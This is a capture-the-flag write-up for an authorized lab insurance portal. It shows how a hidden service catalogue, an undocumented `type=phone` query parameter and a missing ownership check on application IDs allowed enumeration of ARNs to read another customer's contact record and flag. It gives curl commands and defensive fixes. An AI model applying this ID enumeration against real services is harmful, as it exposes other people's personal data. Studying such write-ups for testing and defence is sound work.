# Aegis Flex — Hidden Service Catalogue + Contact IDOR

**Date:** 2026-07-10  
**Target type:** PwnBox lab (authorized)  
**URL:** https://89aacd38eb6c.pwnbox-lab.com/  
**Theme:** Dashboard loads a templated service map; contact service omitted from dashboard catalogue  
**Status:** **SOLVED**

## Goal

Obtain `pwnbox{...}` from the Aegis Flex insurance quote portal.

## Lab hint

> The dashboard fetches its own service map from a templated path and renders the policy widgets. The contact service isn't on the dashboard map — and nothing in the bundle names it. Grep all you like; the bug is in what the catalogue doesn't tell you.

---

## Observation

- Login: `POST /api/login` JSON `{"username":"demo","password":"demo"}` → signed cookies `session` + `session.sig`
- Session payload (base64): `{"user":"demo"}`
- Dashboard: `GET /dashboard` loads `/js/app.bundle.js`
- Client sub-app detection:

```javascript
function g() {
  let o = window.location.href;
  return o.endsWith("/aegis/pib#/") || o.endsWith("/aegis/flexi#/") ? "aegis" : "dashboard";
}
var f = g(), w = "/apiendpoints/" + f + "/serviceConfigs.json";
```

- Dashboard widgets: quote, policies, claims, documents, statements, notifications
- Aegis sub-app widget: contact only (class `h`, calls `d(cfg, me.arn, "summary")`)
- Notification n-3: *"Adviser note — application for Mira Patel finalised; awaiting customer e-signature."*

---

## Hypothesis

1. Dashboard catalogue omits the contact/shield API entirely.
2. Alternate catalogue at `/apiendpoints/aegis/serviceConfigs.json` reveals contact paths.
3. Catalogue documents `contactSubResource` but not the `type` query parameter or `flag` field semantics.
4. Contact service may lack object-level authorization on application ARN (IDOR).

---

## Evidence

### Dashboard catalogue (no contact service)

`GET /apiendpoints/dashboard/serviceConfigs.json`

```json
{
  "subApp": "dashboard",
  "serviceUrl": {
    "eapi": {
      "policySummary": "dwi-policy-summary-hk-ea-cert-proxy/v3/customers/policies",
      "policyDetails": "dwi-policy-details-hk-ea-cert-proxy/v3/customers/policies",
      "documents": "dwi-documents-hk-ea-cert-proxy/v2/customers/documents",
      "statements": "dwi-statements-hk-ea-cert-proxy/v2/customers/statements",
      "claims": "dwi-claims-hk-ea-cert-proxy/v2/customers/claims"
    },
    "content": { "...": "content/dashboard/..." }
  }
}
```

No `shieldapi`, no `contactSubResource`.

### Aegis catalogue (contact service present)

`GET /apiendpoints/aegis/serviceConfigs.json` (works unauthenticated)

```json
{
  "subApp": "aegis",
  "serviceUrl": {
    "shieldapi": {
      "contactInformation": "aegis-contact-service-stg05-proxy/v6/applications",
      "newApplication": "aegis-routing-service-stg05-proxy/v6/applications",
      "deleteContactDetails": "aegis-contact-service-stg05-proxy/v6/applications",
      "beneficiaries": "aegis-beneficiaries-service-stg05-proxy/v6/applications"
    }
  },
  "contactSubResource": "involved-parties/contacts"
}
```

Catalogue does **not** document `type` values.

### Contact `type` parameter (undocumented)

```text
GET .../contacts?type=summary  -> {"arn":"1743465601777"}
GET .../contacts?type=email    -> {"arn":"...","emails":[...]}
GET .../contacts?type=phone    -> full record incl. "flag" field
GET .../contacts?type=invalid  -> {"error":"unsupported contact type","supported":["summary","email","phone"]}
```

Widget hardcodes `type=summary` — never requests `phone`.

### Demo user

`GET /api/v1/user/me`:

```json
{"arn":"1743465601777","name":"Jordan Demo","plan":"Aegis Flex"}
```

Jordan contact (`type=phone`):

```json
{"arn":"1743465601777","name":"Jordan Demo","plan":"Aegis Flex","emails":["jordan.demo@example.test"],"phones":["+44 7700 900111"],"flag":null}
```

Draft policy `AFX-2026-001844` — flag null likely because application not finalised.

### ARN enumeration (IDOR confirmed)

Parallel scan of `1743465600000–1743465609999` with `type=phone` found **14 valid records**. Only Mira Patel returned non-null flag:

| ARN | Name | flag |
|-----|------|------|
| 1743465601904 | Mira Patel | `pwnbox{c1d0a9f8e7b6453221098a7b6c5d4e3f}` |
| 1743465601777 | Jordan Demo | null |
| (12 others) | various | null |

---

## Test

```bash
BASE="https://89aacd38eb6c.pwnbox-lab.com"
curl -sS -c /tmp/aegis.cj -X POST "$BASE/api/login" \
  -H "Content-Type: application/json" -d '{"username":"demo","password":"demo"}'

curl -sS -b /tmp/aegis.cj "$BASE/apiendpoints/aegis/serviceConfigs.json"

curl -sS -b /tmp/aegis.cj \
  "$BASE/aegis-contact-service-stg05-proxy/v6/applications/1743465601904/involved-parties/contacts?type=phone"
```

---

## Result

**Flag:** `pwnbox{c1d0a9f8e7b6453221098a7b6c5d4e3f}`

Root cause stack:

1. Security through obscurity — contact service omitted from dashboard catalogue but reachable via aegis catalogue and direct proxy paths.
2. Undocumented API surface — `type=phone` exposes sensitive `flag` field not listed in service map.
3. IDOR — no ownership check on application ARN in contact service.

---

## Failed / ruled out

| Test | Result |
|------|--------|
| Session cookie tampering (`{"user":"mira"}`) | 401 — sig required |
| `/aegis/pib`, `/aegis/flexi` | 403 Forbidden |
| Routing POST new application | Returns ARN not present in contact DB |
| Underwriting / finalise endpoints | 404 |
| Beneficiaries service | 404 |
| `apiendpoints/{other}/serviceConfigs.json` | Only `dashboard` and `aegis` exist |
| Policy number as contact ARN | not found |
| Unauthenticated contact access | Redirect to login |

---

## Fix (defensive)

- Enforce object-level authorization: session user must own requested ARN.
- Remove `flag` from customer-facing contact responses; use internal-only endpoint.
- Do not rely on catalogue omission for access control.
- Rate-limit sequential ARN probing.

---

## Reusable artifacts

- `writeups/aegis-flex-hidden-service-catalogue-idor.md`
- `notes/hidden-service-catalogue-api-parameter-idor.md`
- `payloads/aegis-flex-contact-type-phone-idor.md`
- `checklists/service-catalogue-subapp-recon.md`
